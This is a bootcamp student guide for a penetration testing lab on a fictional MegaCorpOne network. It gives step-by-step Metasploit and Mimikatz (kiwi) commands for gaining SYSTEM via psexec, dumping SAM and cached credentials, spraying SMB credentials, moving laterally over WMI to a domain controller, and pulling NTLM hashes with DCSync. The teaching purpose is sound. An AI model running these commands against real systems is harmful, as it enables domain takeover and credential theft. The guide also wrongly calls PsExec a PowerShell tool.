##  17.3 Student Guide: Windows Persistence, Lateral Movement, Credential Access, and Review				

### Overview

In today's class, you will finish the second penetration testing module by establishing persistence on a Windows machine, laterally moving to the domain controller, and then accessing the database where Active Directory credentials are stored. The day will finish with a Kahoot review of the pen testing unit.


### Class Objectives

By the end of class, you will be able to:

- Understand how Windows credentials and Mimikatz work.

- Perform lateral movement to other machines in a network. 

- Explain what DC replication is and how to use the DCSync attack.



### Slideshow

The lesson slides are available on Google Drive here: [17.3 Slides](https://docs.google.com/presentation/d/1iN6rbfW3oStGNB_TAcxkOjydNdB35ZBmE1lTX1uPKwM/edit#slide=id.p).

-------

### 01. Windows Credentials Refresher 

In this session, we'll finish the penetration testing modules with Windows persistence, lateral movement, and credential access.

In the previous class, we were able to escalate to SYSTEM privileges.

  - With SYSTEM privileges, we now have the ability to dump credentials that are stored in Windows. 
  
In Linux, we were able to dump credentials (usernames + hashes) by viewing the contents of the `/etc/shadow` file. 
- In Windows, credentials are stored in the **Security Accounts Manager (SAM)** database. 
- This database is stored within the **Local Security Authority Subsystem Service (LSASS)** process. 
- Therefore, if we are able to access LSASS, which is always run as SYSTEM, we can dump the contents of the process, which includes the SAM database and thus any credentials stored in it.
- Local account passwords are continuously stored in SAM and will always be available offline.

Domain accounts, which primarily use Kerberos for authentication, do not have their credentials stored in SAM. 
- Instead, when a domain user logs in to Windows, their credentials are cached in the registry. 
- The registry is a database in Windows that stores settings for Windows and applications. 
- The registry setting is `HKEY_LOCAL_MACHINE\Security\Cache`, which is held in the file `C:\Windows\System32\config\SECURITY`, as the image shows: 

  ![A screenshot depicts the location of the registry in the file manager.](Images/registry.PNG)

- This specific registry key appears blank, as it is only accessible by SYSTEM. However, if you look for the file `C:\Windows\System32\config\SECURITY`, you will see that it has data in it, as the image shows:

	 ![A screenshot depicts the file in the file manager.](Images/security.PNG)

   - Again, this is not viewable as a standard user&mdash;you must be SYSTEM to access the file. 

- By default, in Windows 10, up to 10 network or domain credentials are cached at a time. This default value is viewable in the local security policy, as the image shows:

	![A screenshot depicts the Local Security Policy dialog box.](Images/LSP.PNG)

According to Windows, each unique user's logon information is cached locally so that, in the event that a domain controller (DC) is unavailable during subsequent logon attempts, they are able to log on. The cached logon information is stored from the previous logon session.

- Even as SYSTEM, viewing the contents of the registry key would not yield any decipherable hash, as the passwords are hashed *and* salted using a hashing algorithm called **MsCacheV2**. However, we'll use tools that are able to decrypt the contents. 

#### Mikikatz and Kiwi

- **Mimikatz** is a Windows-purposed credential dumping tool that is able to decrypt almost all stored credentials in Windows.
- It is outside the scope of our class to go into details on how Mimikatz works.
- For our class, we'll use the Metasploit version of Mimikatz called **`kiwi`**. 

Let's explore how to use `kiwi`. 

#### Mimikatz Demonstration

First, open a Meterpreter session as SYSTEM on WIN10 by performing the following steps (if a current Meterpreter SYSTEM session isn't already opened).

1. Load the `psexec` module: `use exploit/windows/smb/psexec`

2. Set the following parameters:

	- `set RHOSTS 172.22.117.20`
	
	- `set SMBUSER tstark`
	
	- `set SMBPass Password!`
	
	- `set SMBDomain megacorpone`
	
	- `set LHOST 172.22.117.100`
	
	 ![A screenshot depicts the results of the command.](Images/psexecoptions.PNG)
	
3. Run the module with `run`.

	 ![A screenshot depicts the results of the command.](Images/runpsexec.PNG)
	
Even though we set the credentials to `tstark`, the PSExec module in Metasploit will always open a session as SYSTEM due to how it executes the payload via service creation.


4. In your Meterpreter session, enable the Mimikatz modules by typing `load kiwi`, as the image shows:

	  ![A screenshot depicts the results of the command.](Images/loadkiwi.PNG)

     - Metasploit and Meterpreter both have the ability to load add-ons such as `kiwi`. When a new add-on is loaded, the help menu is updated with commands from the new add-on. 

5. Show all the options available for the `kiwi` modules with the command `?`, as the image shows:

	  ![A screenshot depicts the results of the command.](Images/kiwihelp.PNG)

	 - Since `kiwi` is an adaptation of Mimikatz, the commands are slightly different. 
	 
	 - For example, in Mimikatz, the command `sekurlsa::kerberos` (pronounced "secure LSA" or "secure local security authority") lists all Kerberos credentials on the machine. In `kiwi`, this command is `creds_kerberos`.

6. Begin by running the command `lsa_dump_sam` to dump the contents of SAM. There's a lot of output here, some of which is not important. The most important field is `User, Hash NTLM` as highlighted in the image. 

     - This field contains the NTLM hash for that user.

      ![A screenshot depicts the results of the command.](Images/samdump.png)


7. Another way of obtaining hashes is through the `creds_all` command with `kiwi`. This parses the output neatly, as the image shows:

      ![A screenshot depicts the results of the command.](Images/migratedump.PNG)	

     - **Note:** If you do not get any results with `creds_all`, you most likely need to migrate to a x64 SYSTEM process. 

     - This command looks for credentials in several areas of Windows and dumps them. Note that SAM is not included in `creds_all`. Most likely, the credentials obtained through `creds_all` come from currently logged in users. We can see from the output that `pparker` has their password hash dumped, because they are logged onto the machine.
 
8. One additional area that `creds_all` doesn't cover is cached credentials. Remember that Windows caches credentials when a user logs on. This command doesn't exist in `kiwi`, but luckily we can run actual Mimikatz commands in `kiwi` via the `kiwi_cmd` command. 

9. Run the following command to demonstrate `kiwi_cmd`:

	  - `kiwi_cmd lsadump::sam`
 
	 ![A screenshot depicts the results of the using kiwi command.](Images/kiwicmd.PNG)

	  - This output is the same as `lsa_dump_sam`. In the upcoming activity, you will have to use `kiwi_cmd` to find the cached credentials. 

Refer to the following additional guides for Mimikatz:
- [Mimikatz cheat sheet](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)
- [Mimikatz commands](https://adsecurity.org/?page_id=1821)


### 02. Credential Dumping Activity 

- [Activity File: Credential Dumping](Activities/01_CredDumping/Unsolved/README.md)


### 03. Credential Dumping Review

- [Solution Guide: Credential Dumping](Activities/01_CredDumping/Solved/README.md)

### 04. Lateral Movement 

Since we have now dumped domain credentials, cracked their hashes, and established persistence on one machine, we'll  learn how to expand our access on the network. 

It is rare that a pen tester completes their goal just by accessing a *single machine*. 

- Often, the pen tester needs to move throughout the network, compromising *multiple machines* to either obtain the goal or access needed to achieve the goal. 

- As an example, our objective in this penetration test is to gain access to MegaCorpOne's DC and retrieve the password hash of the `Administrator` user as proof-of-compromise of the domain.

  - In order to accomplish this, we first obtained initial access to the Linux machine and then used the credentials we found on that machine to compromise a Windows machine. 

  - We obtained more credentials on the Windows machine and will now see if those credentials can be used anywhere else. 

  - Our goal is to gain access to credentials that can access the DC, WINDC01, where our objective lies.

#### Credential Spraying Demonstration

Now that we have a new set of credentials, we can test its access by spraying the credentials across the network. 

1. Demonstrate this by loading the `smb_login` module in Metasploit.

	- `use auxiliary/scanner/smb/smb_login`

2. Fill in the SMBDomain, SMBUser, SMBPass, and RHOSTS fields.

	- `set SMBUser bbanner`
	
	- `set SMBPass Winter2021`
	
	- `set SMBDomain megacorpone`
	
	- `set RHOSTS 172.22.117.0/28`
	
	 ![A screenshot depicts the options settings of the module.](Images/smblogin.PNG)

3. Run the exploit.

	- `run`
	
4. Once the scan gets to 172.22.117.10, you should see a successful logon. This is the IP address of WINDC01, meaning the credentials we cracked were highly privileged and we now have access to a DC.

	 ![A screenshot depicts a successful logon using SMBlogin module.](Images/smbspray.png)

#### Lateral Movement

Now that we know we have credentials that can access the DC, we can perform lateral movement, which is the act of moving through the network from one machine to another.

- We can use several different techniques to achieve lateral movement, many of which use Windows tools maliciously.
  - For example, one technique is using PsExec, a tool that manages Windows machines remotely using PowerShell. 
  - We will leverage the credentials that we gathered and cracked from the Windows 10 machine to move off the Windows 10 machine and onto the DC.

- Lateral movement techniques often overlap with initial access techniques, as both tactics typically leverage the execution of code. However, there are two key differences between lateral movement and initial access:
   1. Lateral movement requires already having internal network access, as "lateral" movement means moving inside the network. Initial access refers only to the initial way that we get access to a machine on the internal network.

   2. There's often a greater number of possibilities for code execution when performing lateral movement. 
    - One major reason is that within an internal network, network firewall rules seldom apply. 
    - Internally networked machines often have much greater access to ports to other machines on the network.
      - For example, port 445 is almost always available on all internal Windows machines, but that port is commonly blocked on the internet-facing firewall. 

- Having greater access to ports allows the use of additional techniques, which we will explore.


There are several **lateral movement MITRE techniques**. Refer to the page for [lateral movement on MITRE](https://attack.mitre.org/tactics/TA0008/). 

 1. [Remote Services](https://attack.mitre.org/techniques/T1021/): This is an umbrella technique for any remote services on a machine. For example, SSH, VNC, and Remote Desktop Protocol (RDP) fall under this technique. Specifically, a common lateral movement tool is **PsExec**, which allows an administrator to execute PowerShell commands remotely. A pen tester can leverage this by remotely executing a malicious PowerShell payload on a remote machine to gain access to it.

 2. [Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/): This technique leverages RDP, which lets a user log in to a machine remotely and control it as if they are logged in to it physically. Pen testers can leverage this by logging in to any machines their compromised user has RDP access to. 

 3. [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/): Exploitation of old services is also a common lateral movement technique for pen testers. The SMB protocol has had several critical-severity vulnerabilities that allowed a pen tester to easily get SYSTEM privileges remotely over a machine. 

 4. [Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/): This last example uses SMB to get access to a remote file system. In addition to serving the file system service, SMB is also used in conjunction with another protocol, RPC, in order to transfer files or access services such as Task Scheduler or Service Controller. 

	
### 05. Lateral Movement Activity

For this demo, you'll use bbanner's credentials to move laterally from Windows 10 to WINDC01. 

**Note:** This requires a SYSTEM shell on the Windows 10 machine. If you do not have a SYSTEM shell, use `exploit/windows/smb/psexec` with `tstark`'s credentials to obtain one.

1. Perform lateral movement to WINDC01 by using WMI via Metasploit. First, ensure you're working from a SYSTEM level shell on the Windows 10 machine, then use the `exploit/windows/local/wmi` module.

	- `use exploit/windows/local/wmi`
	
2. Set the following parameters:
		
	- `set RHOSTS 172.22.117.10`

        - `set LHOST 172.22.117.100`
	
	- `set SESSION [ID of the active Meterpreter session running as SYSTEM]`
	
	- `set SMBDomain megacorpone`
	
	- `set SMBUser bbanner`
	
	- `set SMBPass Winter2021`
	
	And run the payload:
	
	- `run -j`

	 ![A screenshot depicts the module settings.](Images/wmioptions.PNG)	
	
3. Run the exploit. It may give an error, but should return another Meterpreter session on the WINDC01 machine.

	- `run`
	
	- `sysinfo`

	 ![A screenshot depicts the successful run and info of the system.](Images/wmiexploit.PNG)		
	
We successfully launched the WMI exploit from our Meterpreter session on Windows 10 to WINDC01. From a network traffic perspective, the exploit content occurred between Windows 10 and WINDC01, instead of Kali to WINDC01.

### 06. Credential Access 

Since we now have access to WINDC01 from a SYSTEM Meterpreter shell, we have unfettered access to the entire domain. Two key pieces of the Active Directory (AD) domain are now under our control:

- The bbanner account, which is part of the Domain Administrators group in AD. This means that we have the ability to log in to any machine by default, to create and delete accounts, reset passwords, etc.

- WINDC01, which is the primary DC for the domain. This is the machine that handles network logins, access control for network assets, etc.

DCs are heavily controlled and defended for this reason. Having SYSTEM or Administrator access to a DC means you have access (either directly or indirectly) to every single domain user's password hash, which, of course, can be exfiltrated and then cracked offline.

There can be multiple DCs on a network. 

- Often, there's a "primary" DC, which handles the Kerberos authentication and other services, such as DNS. 
- "Secondary" DCs often have other services running, such as file shares and VoIP services. 
- However, if they are configured with domain services, they can act as backups to the primary DC. 

In the event the primary DC goes down, the secondary DC handles authentication. In order for this to properly happen, the secondary DCs must replicate the data from the primary DC. 

- MegaCorpOne only has a single DC, no secondaries.

- The ability to replicate data from a DC is a reserved privilege for DC computer accounts or domain administrators. 

- User password hashes are stored on disk on the primary DC inside the `C:\Windows\System32\NTDS.dit` file. Historically, this file was heavily targeted by pen testers. However, due to changes in how the hashes are actually stored and how the `NTDS.dit` file is read, this technique is not applicable to Windows 10+ and Server 2016+.

**DCSync**

The newer, preferred technique for accessing password hashes on DCs is called **DCSync**. 

- **DCSync** involves replicating the data from a DC and parsing through it to extract the password hashes for users. 
- DCSync requires replication rights, so you must have a domain administrator account or be SYSTEM on a DC itself. 
- DCSync itself does not have a standalone Metasploit module. However, we can use `kiwi`, the Metasploit implementation of Mimikatz, to perform DCSync.
- The major difference using DCSync in `kiwi` vs. the `.exe` version of Mimikatz is that with DCSync in `kiwi`, you must specify a username with the password hash you want. The `.exe` version of Mimikatz will return all users' password hashes when performing DCSync.

#### Credential Access Demo

In order to find out what users are on the domain, we'll use the `net` command, which allows a user to list groups, users, network connections, etc. on a Windows machine.

1. In the SYSTEM Meterpreter shell on WINDC01, enter a `shell`.

	- `shell`
	
	 ![A screenshot depicts entering a command shell.](Images/shell.PNG)	
	
2. Type `net users` to view the users on the machine. Performing this command on a non-DC will only display local users. Since we're on a DC, there are no local users and all users on a DC are domain users, thus `net users` displays all users in the domain.

	- `net users` 
	
	 ![A screenshot depicts displaying the domain users.](Images/netusers.PNG)	
	
3. `exit` the command shell and load `kiwi`.

	- `exit`
	
	- `load kiwi`

4. Now that we have a list of users, we can request their NTLM passwords via DCSync attack.

	- `dcsync_ntlm cdanvers`
	
	 ![A screenshot depicts dcsyncing the cdanvers user.](Images/dcsync.PNG)	
	
5. From here, we could DCSync every user and put their NTLM hashes in a list in an attempt to crack their passwords.


### 07. Credential Access Activity 


- [Activity File: Credential Access](Activities/03_CredentialAccess/Unsolved/README.md)


### 09. Credential Access Activity Review 


- [Solution Guide: Credential Access](Activities/03_CredentialAccess/Solved/README.md)

### 10.  Penetration Testing 2 Recap

-  [Kahoot! Pen Testing Week 2 Challenge](https://create.kahoot.it/details/3f1cd12f-635d-4dfe-9492-0e0d7fd99a77)
   

-------

&copy; 2023 edX Boot Camps LLC. Confidential and Proprietary. All Rights Reserved.  
